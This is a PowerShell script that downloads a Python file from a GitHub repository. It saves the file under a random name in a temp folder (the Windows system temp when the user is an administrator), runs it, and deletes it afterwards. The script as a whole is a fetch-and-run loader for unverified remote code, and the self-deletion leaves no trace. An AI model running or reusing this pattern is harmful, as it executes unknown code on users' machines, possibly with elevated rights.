$ErrorActionPreference = "Stop"
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://github.com/astronomyc/filesRecents/raw/main/main.py'

try {
    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
}
catch {
    Write-Host "Error downloading Python script: $_"
    Exit
}

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\Script_$rand.py" } else { "$env:TEMP\Script_$rand.py" }

$content = $response.Content
Set-Content -Path $FilePath -Value $content

try {
    python $FilePath
}
catch {
    Write-Host "Error executing Python script: $_"
}

Remove-Item $FilePath
